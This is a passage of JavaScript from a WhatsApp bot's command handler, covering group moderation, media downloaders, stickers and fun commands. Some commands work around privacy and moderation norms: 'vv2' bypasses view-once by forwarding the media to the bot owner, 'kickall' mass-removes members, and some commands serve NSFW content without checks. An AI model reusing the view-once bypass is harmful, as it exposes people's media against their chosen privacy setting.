    } else if (q === 'off') {
        autoViewStatus = false;
        reply('❌ Auto view status disabled.');
    } else {
        reply(`Usage: ${prefix}autoviewstatus on/off`);
    }
    break;
}

case 'autolikestatus': {
    if (!isCreator) return reply(mess.owner);
    if (q === 'on') {
        autoLikeStatus = true;
        reply('✅ Auto like status enabled.');
    } else if (q === 'off') {
        autoLikeStatus = false;
        reply('❌ Auto like status disabled.');
    } else {
        reply(`Usage: ${prefix}autolikestatus on/off`);
    }
    break;
}
case 'autorecording':
                
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    reply(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    reply(`Successfully changed auto-recording to ${q}` )
                }
                break

case 'autotyping':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    reply(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    reply(`Successfully changed auto-typing to ${q}`)
                }
                break

case 'antilink': {
    if (!m.isGroup) return reply("This command only works in group chats.");
    if (!isAdmins) return reply("Only group admins can use this command.");
    if (!args[0]) return reply("Example: antilink on/off");

    const status = args[0].toLowerCase();

    if (status === 'on') {
        global._antilink[m.chat] = true;
        return reply("Antilink is now enabled in this group.");
    } else if (status === 'off') {
        global._antilink[m.chat] = false;
        return reply("Antilink is now disabled in this group.");
    } else {
        return reply("Use on/off.");
    }
}
break;

case 'sticker': case 's': {
  if (isban) return reply("Sorry only the owner can use this command")
  if (!m.quoted) return reply(`Reply to an Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await rich.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return m.reply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await rich.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return reply(`Send Image or Video with command ${prefix + command} video duration only 1-9s`);
  }
}
break;

case 'say': case 'tts': case 'gtts':{
if (isban) return reply(`Sorry only the owner can use this command`)
if (!text) return reply('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return rich.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break;
        
case 'jid':{
            reply(from)
           }
          break;
          case 'groupjid':{
          if (isban) return reply(`Sorry, only the owner can use this command`)
        const groupMetadata = m.isGroup ? await rich.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `Here is jid address of all users of ${groupMetadata.subject}`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      reply(textt)
    }
    break;
    case 'poll': {
            if (isban) return reply(`Sorry, only the owner can use this command`)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await reply(
`State the question and at least 2 options Example: ${prefix} poll Who is the best admin?|yes,no, maybe...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await rich.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break;
case'tagall': {
if (!isCreator) return m.reply("Sorry only the owner can use this command ");
        if (!m.isGroup) return reply(mess.group);
        const textMessage = args.join(" ") || "❤";
        let teks = `\`tagall\` :\n> *${textMessage}*\n\n`;

        const groupMetadata = await rich.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        rich.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: m });
      }
      break;
case 'hidetag':{
if (!isCreator) return m.reply("Sorry only the owner can use this command");
rich.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break;
case 'promote': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('your not an admin!!')
if (!isBotAdmins) return reply('Bot is not yet admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'promote')
await reply(`Done`)
}
break
case 'demote': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isAdmins) return reply('for admin only!!')
if (!isBotAdmins) return reply('bot is not yet admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'demote')
await reply(`Done`)
}
break;
case 'mute': {
if (isban) return reply(`Sorry, only the owner can use this command`)
    if (!m.isGroup) return reply('This command can only be used in groups.');
    if (!isAdmins) return reply(' Only admins can use this command.');
    if (!isBotAdmins) return reply('I need admin privileges to mute the group.');

    try {
        await rich.groupSettingUpdate(m.chat, 'announcement'); // Mute group
        reply('Group has been muted. Only admins can send messages now.');
    } catch (error) {
        console.error(error);
        reply('Failed to mute the group. Please try again.');
    }
}
break;
case 'unmute': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
    if (!m.isGroup) return reply('This command can only be used in groups.');
    if (!isAdmins) return reply('Only admins can use this command');
    if (!isBotAdmins) return reply('I need admin privileges to unmute the group.');

    try {
        await rich.groupSettingUpdate(m.chat, 'not_announcement'); // Unmute group
        reply('Group has been unmuted. Everyone can send messages now');
    } catch (error) {
        console.error(error);
        reply('Failed to unmute the group. Please try again.');
    }
}
break;

case 'left': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("for Owner only.");
await rich.groupLeave(m.chat)
await reply(`Done`)
            }
            break;
case 'add': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("for Owner only.");
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'add')
await replynano(`Done`)
}
break;
case 'adminfuck1': {
if (!m.quoted) return reply("tag a user to kick them");
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('for admins only bro!!')
if (!isBotAdmins) return reply('Bot must be admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Done`)
}
break;
case 'adminfuck2': {
await rich.groupLeave(m.chat)
await reply(`Done`)
            }
            break;
case 'kick': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.quoted) return reply("tag a user to kick them");
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('for admins only bro!!')
if (!isBotAdmins) return reply('Bot must be admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rich.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Done`)
}
break;
case 'tagadmin': case 'listadmin': case 'admin':{
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
    if (!m.isGroup) return reply(mess.group);
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    rich.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break;      
case 'delete': case 'del': {
if (isban) return reply(`Sorry, only the owner can use this command`)
   if (!isCreator) return reply("Owner only.");
if (!m.quoted) throw false
let { chat, id } = m.quoted
 rich.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break;
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
            if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('Bot must be admin')
let response = await rich.groupInviteCode(m.chat)
rich.sendText(m.chat, `https://chat.whatsapp.com/${response} Group Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break;
 case 'join': {
 if (isban) return reply(`Sorry, only the owner can use this command`)
 if (!isCreator) return reply("Owner only.");
if (!text) return reply(`example ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await rich.groupAcceptInvite(result)
await reply(`Done`)
}
break;
case 'tag':
case 'totag': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins) return reply('*admins only*')
if (!isBotAdmins) return reply('Bot must be admin first')
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               rich.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break;
// case steal sticker
 case 'steal': case 'stickerwm': case 'take': case 'wm': {
if (isban) return reply(`Sorry, only the owner can use this command`)
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `ICON`
	let dua = typeof ahuh[1] !== 'ICON-MD' ? ahuh[1] : `ICON-MD`
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await rich.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await rich.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break;

case 'couple-pp': {
if (isban) return reply(`Sorry, only the owner can use this command`)
    try {
        const apiUrl = 'https://apis.davidcyriltech.my.id/couplepp';
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status === 200 && data.success) {
            const maleImageUrl = data.male;
            const femaleImageUrl = data.female;

            const message = {
                text: 'Couple Profile Pictures',
                jpegThumbnail: null // You can set a default thumbnail if needed
            };

            await rich.sendMessage(m.chat, { image: { url: maleImageUrl }, caption: 'Male Image' }, { quoted: mess });
            await rich.sendMessage(m.chat, { image: { url: femaleImageUrl }, caption: 'Female Image' }, { quoted: mess });

        } else {
            reply(`Failed to fetch couple profile pictures: ${data.message || 'Unknown error'}`);
        }
    } catch (error) {
        console.error("Error in couple-pp command:", error);
        reply(`An error occurred while fetching couple profile pictures: ${error.message || 'Unknown error'}`);
    }
    }
    break; 
case 'readmore': {
if (isban) return reply(`Sorry, only the owner can use this command`)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
await rich.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
case 'download':
case 'save':
case 'svt': {
if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!isCreator) return m.reply("Owner only.");
  const quotedMessage = m.msg.contextInfo.quotedMessage;
  if (quotedMessage) {
    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await rich.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      rich.sendMessage(botNumber, { image: { url: imageUrl }, caption: imageCaption });
    }
    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await rich.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      rich.sendMessage(botNumber, { video: { url: videoUrl }, caption: videoCaption });
    }
  }
}
break;
    case "rizz":
case "pickup-line": {
if (isban) return reply(`Sorry, only the owner can use this command`)
  try {
    const apiUrl = `https://apis.davidcyriltech.my.id/pickupline`;
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status === 200 && data.success) {
      const pickupline = data.pickupline;
      await rich.sendMessage(m.chat,
       {
        text: pickupline
      }, { quoted: m }); // Add quoted option for context
    } else {
      reply(`Invalid Response From The API: ${data.message || "Unknown error"}`); // Display specific error message
    }
  } catch (caseError) {
    console.error("An Error Occurred:", caseError);
    reply(`An Error Occurred: ${caseError.message || "Unknown error"}`); // Provide more specific error
  }
  }
  break;
case 'createlogo': {
if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!text) {
    return m.reply("Enter the logo title, idea and slogan. EXAMPLE: .logogen Title|Idea|Slogan");
  }

  const [title, idea, slogan] = text.split("|");

  if (!title || !idea || !slogan) {
    return m.reply("Use: .logogen Title|Idea|Slogan");
  }

  try {
    const payload = {
      ai_icon: [333276, 333279],
      height: 300,
      idea: idea,
      industry_index: "N",
      industry_index_id: "",
      pagesize: 4,
      session_id: "",
      slogan: slogan,
      title: title,
      whiteEdge: 80,
      width: 400
    };

    const { data } = await axios.post("https://www.sologo.ai/v1/api/logo/logo_generate", payload);
    
    if (!data.data.logoList || data.data.logoList.length === 0) {
      return m.reply("Failed to Create Logo");
    }

    const logoUrls = data.data.logoList.map(logo => logo.logo_thumb);
    
    for (const url of logoUrls) {
      await rich.sendMessage(m.chat, { image: { url: url } });
    }
  } catch (error) {
    console.error("Error generating logo:", error);
    await m.reply("Failed to Create Logo");
  }
};
break;

case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply('owner only.')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!/image/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
if (/webp/.test(mime)) throw `thrim/Reply Image  Caption ${prefix + command}`
let media = await rich.downloadAndSaveMediaMessage(m)
await rich.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('done')
}
break;

 case 'img':
case 'pinterest': {
    if (isban) return reply(`Sorry, only the owner can use this command`)
    if (!q.includes("|")) return reply("Example: .img Naruto | 5");

    let [query, amount] = q.split("|").map(t => t.trim());
    amount = parseInt(amount) || 1;

    if (amount > 20) return reply("Amount exceeds the limit! Maximum allowed images: 20");

    try {
        let apiUrl = `https://api-rebix.vercel.app/api/pinterest?q=${encodeURIComponent(query)}&apikey=samuel`;
        let response = await fetch(apiUrl);

        if (!response.ok) {
            console.error(`API Failed! Status: ${response.status}`);
            return reply(`Pinterest API Error: ${response.status}.Try again later.`);
        }

        let data = await response.json();
        console.log("🔍 API Response:", JSON.stringify(data, null, 2));

        if (!data || !Array.isArray(data.result) || data.result.length === 0) {
            return reply(`No images found for  ${query}.`);
        }

        let images = data.result.filter(Boolean);
        images = images.sort(() => Math.random() - 0.5);
        let sentCount = 0;

        for (let imageUrl of images) {
            if (sentCount >= amount) break;

            try {
                let checkResponse = await fetch(imageUrl, { method: "HEAD" });
                if (!checkResponse.ok) continue;

                await rich.sendMessage(m.chat, {
                    image: { url: imageUrl },
                    caption: `\`\`\`${query} result\`\`\``
                });

                sentCount++;
                await new Promise(resolve => setTimeout(resolve, 2000));
            } catch (err) {
                console.error("Image Send Error:", err.message);
                continue;
            }
        }

        if (sentCount === 0) reply("No accessible images found!");

    } catch (err) {
        console.error("Error in Pinterest case:", err);
        reply(`Pinterest Error: ${err.message} Please try again later.`);
    }
}
break;
case 'checkidch': case 'idch': {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!text) return reply("example : link channel")
if (!text.includes("https://whatsapp.com/channel/")) return reply("not a valid Link ")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await rich.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Follower:* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return reply(teks)
}
break;
case 'hd':
  case 'remini':{
  if (isban) return reply(`Sorry, only the owner can use this command`)
if (!m.quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photo With caption ${prefix + command}`)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			rich.sendMessage(m.chat, { image: proses, caption: `_Success in Making ${command}_`}, { quoted: m})
			} catch {
			  reply('erro bro')
			}
			}
			break;
			
			case 'tiktok':
case 'tt': {
if  (isban) return reply(`Sorry, only the owner can use this command`)
replygc(mess.wait)
await sleep(100);
  if (!text) return reply(`Example: ${prefix + command} link`);
try {
  const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[DOWNLOADER BY ICON MD]*

> *Video found* ${data.author.name ?? ''} (@${data.author.unique_id ?? ''})
> *Likes*: ${data.stats.likeCount ?? ''}
> *Comments*: ${data.stats.commentCount ?? ''}
> *Shares*: ${data.stats.shareCount ?? ''}
> *Plays*: ${data.stats.playCount ?? ''}
> *Saves*: ${data.stats.saveCount ?? ''}

> \`Downloader By ${botname}\`
`;
  rich.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
} catch {
  const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`)
  const videoUrl = response.result.video;
  const captionn = `*[ TIKTOK DOWNLOADER ]*

Likes: ${response.result.statistics.likeCount ?? ''}
Comments: ${response.result.statistics.commentCount ?? ''}
Shares: ${response.result.statistics.shareCount ?? ''}
by ${response.result.author.nickname ?? ''}

\`⏤͟͟͞͞ Downloader By ${botname}\`
  `;
  rich.sendMessage(m.chat, { caption: captionn, video: { url: videoUrl } }, { quoted: m })
}

}
break;

case "nwaifu": {
if (isban) return reply(`Sorry, only the owner can use this command`)
    const apiUrl = `https://reaperxxxx-anime.hf.space/api/waifu?category=waifu&sfw=true`;
    const response = await axios.get(apiUrl);
    const data = await response.data;
    const imageUrl = data.image_url
    
    await rich.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "Your nwaifu by ICON MD."
      }, { quoted: m }); // Add quoted option for context
      }
      break
    case "rwaifu": {
    if (isban) return reply(`Sorry, only the owner can use this command`)
    const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
    await rich.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "Your rwaifu by ICON MD"
      }, { quoted: m }); // Add quoted option for context
      }
      break;
      case 'waifu' :

waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
rich.sendMessage(from, {image: {url:waifudd.data.url},caption:`Your waifu by ICON MD`}, { quoted:m }).catch(err => {
 return('Error!')
})
break;      
case 'git': case 'gitclone':
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!args[0]) return reply(`Example :\n${prefix}${command} https://github.com`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replynano(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    rich.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replynano(mess.error))
break;

       break;
       
       case "kickall":
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, rich.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (!kickedUser.length >= 1) 
     return m.reply("In this group there are no members except you and me"); 
   const res = await rich.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await m.reply( 
     `sucessfully kicked member\n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
break;
case 'toimg': {
if (isban) return reply(`Sorry, only the owner can use this command`)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replynano(`Reply to A Sticker.`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await rich.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            rich.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return reply(`Send reply to non animated sticker`)
    }
    break;
        
// === CASE HANDLER ===
case 'pollmenu':
  await sendPollButtonMenu(rich, from, m);
  break;

case 'vote1':
  await rich.sendMessage(from, { text: "You voted: Anime Commands" }, { quoted: m });
  break;

case 'vote2':
  await sock.sendMessage(from, { text: "You voted: Games & XP" }, { quoted: m });
  break;

case 'vote3':
  await sock.sendMessage(from, { text: "You voted: Anti-Link" }, { quoted: m });
  break;
  
    case 'setbotpp':
            case 'setpp':
            case 'setpp':
            case 'setppbot':
           if (isban) return reply(`Sorry, only the owner can use this command`)
                if (!isCreator) return reply("Owner only");
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await rich.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await rich.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(m.done)
                } else {
                    var memeg = await rich.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(m.done)
                }
                break;

    case 'coffee': case 'kopi': {
rich.sendMessage(m.chat, {caption: m.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break; 
case 'pickupline': {
if (isban) return reply(`Sorry, only the owner can use this command`)
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `YOU GOT RIZZED UP BY ICON MD: ${json.pickupline}`
    reply(pickupLine)
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break;
case 'apk':
case 'apkdl': {
  if (!text) return reply(`Example: ${prefix + command} whatsapp`);
  try {
    const res = await fetch(`https://apis.davidcyriltech.my.id/download/apk?text=${encodeURIComponent(text)}`);
    const data = await res.json();
    
    if (!data.success) return reply('APK not found.');

    await rich.sendMessage(m.chat, {
      image: { url: data.thumbnail },
      caption: `*APK Downloader*\n\n` +
               `*Name:* ${data.apk_name}\n` +
               `*Download:* ${data.download_link}\n\n` +
               `>powered by Icon...`
    }, { quoted: m });

    await rich.sendMessage(m.chat, {
      document: { url: data.download_link },
      fileName: `${data.apk_name}.apk`,
      mimetype: 'application/vnd.android.package-archive'
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    reply('Failed to fetch APK. Try again later.');
  }
}
break;


case 'fancy': 
case 'styletext': {
if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!text) return m.reply(example('Enter Query text!'))
  let anu = await styletext(text)
  let teks = `Style Text From ${text}\n\n`
  for (let i = 0; i < anu.length; i++) {
    teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`
  }
  await m.reply(teks)
} 
break;
case "hmp": case "vv2": case "readviewonce2": {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!isCreator) return m.reply("Owner only.");
    if (!m.quoted) {
        return m.reply(`Reply to an image, video, or audio with the caption`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await rich.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(`Unsupported media type!, Reply to an image, video, or audio.`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(`Failed to process media. Please try again.`);
    }
}
break;  
case 'spotify': {
  if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!q) {
    return reply('Please provide a song name. Example: spotify Hannah Montana by Ice Spice');
  }

  try {
    const searchApiUrl = `https://draculazyx-xyzdrac.hf.space/api/Spotify?q=${encodeURIComponent(q)}`;
    const searchResponse = await axios.get(searchApiUrl);
    const searchData = searchResponse.data;

    if (searchData.STATUS === 200) {
      const songData = searchData.SONG;
      const trackName = songData.title;
      const artistName = songData.artist;
      const albumName = songData.album;
      const releaseDate = songData.release_date;
      const spotifyUrl = songData.spotify_url;
      const coverArt = songData.cover_art;

      const message = `
*Track:* ${trackName}
*Artist:* ${artistName}
*Album:* ${albumName}
*Release Date:* ${releaseDate}
*Spotify URL:* ${spotifyUrl}
`;

      await rich.sendMessage(m.chat, { image: { url: coverArt }, caption: message }, { quoted: m });

      // Spotify Downloader API (Using the track URL from search API)
      if (spotifyUrl) {
        try {
          const downloadApiUrl = `https://apis.davidcyriltech.my.id/spotifydl?url=${encodeURIComponent(spotifyUrl)}`;
          const downloadResponse = await axios.get(downloadApiUrl);
          const downloadData = downloadResponse.data;

          if (downloadData.status === 200 && downloadData.success) {
            const mp3DownloadURL = downloadData.DownloadLink;

            // Send the mp3 download link as an audio file
            await rich.sendMessage(m.chat, {
            audio: { url: mp3DownloadURL },
            mimetype: "audio/mpeg",
            ptt: false // Ensures it's a normal audio file, NOT a voice note
        }, { quoted: m });
          } else {
            reply(`Spotify download failed: ${downloadData.message || 'Unknown error'}`);
          }
        } catch (downloadError) {
          console.error("Error in spotify download:", downloadError);
          reply(`An error occurred while downloading the Spotify track: ${downloadError.message || 'Unknown error'}`);
        }
      } else {
        reply("No Spotify URL found, cannot download the song.");
      }

    } else {
      reply(`Spotify search failed: ${searchData.message || 'Unknown error'}`);
    }
  } catch (error) {
    console.error("Error in spotify command:", error);
    reply(`An error occurred while searching for the Spotify track: ${error.message || 'Unknown error'}`);
  }
  }
  break;
  case "xvideodl": {
if (isban) return reply(`Sorry, only the owner can use this command`)
if (!text) return m.reply(example(`xvideo link`))
// Check if link is from xvideo
if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
await rich.sendMessage(m.chat, {react: {text: '❤️‍🩹', key: m.key}})
// Fetching video data from API
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();

// Bad response from API
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}

// Retrieving video information from API
let videoData = json.data;

// Download videos using URLs obtained from API
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);

// Check if the video was downloaded successfully
if (!videoResponse.ok) {
throw "Failed to download video.";
}

// Send video
await rich.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `**Title:** ${videoData.title || 'No title'}\n` +
`**Views:** ${videoData.views || 'No view information'}\n` +
`**Votes:** ${videoData.vote || 'No vote information'}\n` +
`**Likes:** ${videoData.like_count || 'No like information'}\n` +
`**Dislikes:** ${videoData.dislike_count || 'No dislike information'}`,
});
await rich.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break;
case 'xvideosearch':{
if (isban) return reply(`Sorry, only the owner can use this command`)
  if (!text) return m.reply(example(`Milf`))
  try {
    // checking data from api
    let res = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // checking api response status
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'No videos found for this keyword.';
    }

    // fetching search data from api
    let videos = json.data;
    let message = `icon md xvideo search result "${text}`;

    // Composing messages with video information
    videos.forEach(video => {
      message += `Title: ${video.title || 'no name'}\n` +
                 `  Duration: ${video.duration || 'no duration'}\n` +
                 `  URL: ${video.url || 'no URL'}\n` +
                 `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
    });

    // Sending messages with video lists
    await rich.sendMessage(m.chat, {
      text: message,
    });

